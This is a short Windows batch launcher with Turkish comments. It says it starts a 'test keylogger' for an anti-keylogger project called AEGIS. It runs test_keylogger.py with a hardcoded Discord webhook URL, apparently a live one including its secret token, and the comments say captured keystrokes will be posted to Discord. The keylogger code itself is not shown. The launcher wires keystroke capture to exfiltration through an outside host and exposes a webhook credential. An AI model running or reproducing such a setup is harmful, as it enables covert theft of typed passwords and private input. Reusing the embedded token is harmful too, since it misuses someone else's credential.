@echo off
rem ============================================================
rem  AEGIS Anti Logger - TEST keylogger (webhook'lu) baslatici
rem  Cift tikla, acilan konsolda yazilar DC'ye dusecek.
rem  Cikmak icin: konsolda Ctrl+C
rem ============================================================
chcp 65001 >nul
title AEGIS Test Logger - Webhook
cd /d "%~dp0"

echo Calisiyor... (log dosyasi: %~dp0aegis_test_log.txt)
echo Discord'a ilk mesaji 10 sn'ye kadar atacak.
echo Cikis icin Ctrl+C
echo.

python "%~dp0test_keylogger.py" ^
  --webhook-url "https://discordapp.com/api/webhooks/1524218947371794464/DUk2YDIuqgnIJTMDt0WpE3mIdDaniNVT2MdTQq2ebI-Wm1MfE7yEtCGNC3DYPWcPuh1M"

echo.
echo ============================
echo Bitti. Konsol yazilarini yukarida gorebilirsin.
pause
